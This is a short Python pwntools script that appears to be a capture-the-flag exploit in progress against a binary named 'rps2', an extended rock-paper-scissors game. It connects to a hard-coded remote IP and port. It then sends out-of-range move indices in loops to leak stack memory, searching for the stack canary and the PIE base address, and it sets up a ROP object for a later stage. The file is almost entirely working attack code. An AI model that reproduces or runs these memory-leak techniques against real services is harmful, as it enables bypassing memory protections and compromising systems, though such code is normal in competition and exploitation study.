import time
from pwn import *

elf = context.binary = ELF('./rps2')
rop = ROP(elf)
#p = process()
#input()
p = remote('157.245.50.225', 3000)

moves = [ "Rock", "Gun", "Lightnig", "Devil", "Dragon", "Water", "Air", "Paper", "Sponge", "Wolf", "Tree", "Human",\
"Snake", "Scissors", "Fire"]

def i_win():
    p.recvuntil(b'I choose ')
    bot = moves.index(p.recvline().strip().decode())
    me = str((bot + 2) % 15 + 1).encode()
    return me

# p.clean()
# p.sendline("18")
# p.recvuntil(b'You chose ')
# canary = u64(p.recvline().strip()[:-1].rjust(8, b'\x00'))
# print(hex(canary))

p.clean()
p.sendline("-183")
p.recvuntil(b'You chose ')
print(hex(u64(p.recvline().strip().ljust(8, b'\x00'))))

# find canary
for i in range(0, 67):
    try:
        time.sleep(0.1)
        p.sendline(str(i))
        p.recvuntil(b'You chose ')
        print(hex(u64(p.recvline().strip()[:-1].rjust(8, b'\x00'))), i)
        p.clean()
    except:
        continue

# find pie
for i in range(-300, 0):
    time.sleep(0.1)
    p.sendline(str(i))
    p.recvuntil(b'You chose ')
    print(hex(u64(p.recvline().strip().ljust(8, b'\x00'))), i)
    p.clean()
